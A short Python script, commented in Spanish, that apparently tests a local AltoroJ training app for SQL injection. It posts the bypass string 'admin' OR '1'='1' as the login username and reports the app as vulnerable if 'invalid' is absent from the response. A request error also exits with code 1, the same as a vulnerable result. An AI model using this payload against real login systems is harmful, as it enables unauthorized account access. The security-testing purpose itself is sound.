import requests

# endpoint de login
url_login = 'http://localhost:8080/AltoroJ/doLogin'

# payload de inyección SQL
payload = "admin' OR '1'='1"

# Datos para el POST

data = {
    'username': payload,
    'password': 'prueba'
}

try:
    # mandamos la solicitud POST al endpoint de login
    response = requests.post(url_login, data=data)

    if "invalid" in response.text.lower():
        print("Inyeccion fallida. Vulnerabilidad no existente.")
        exit(0)  # Retornar 0 si la vulnerabilidad no existe

    else:
        # si no encuentra "invalid" en la respuesta asumimos que el login fue exitoso
        print("Inyeccion exitosa. Vulnerabilidad existente.")
        exit(1)  # Retornar 1 si la vulnerabilidad existe

except requests.exceptions.RequestException as e:
    print(f"error al hacer la solicitud {e}")
    exit(1)

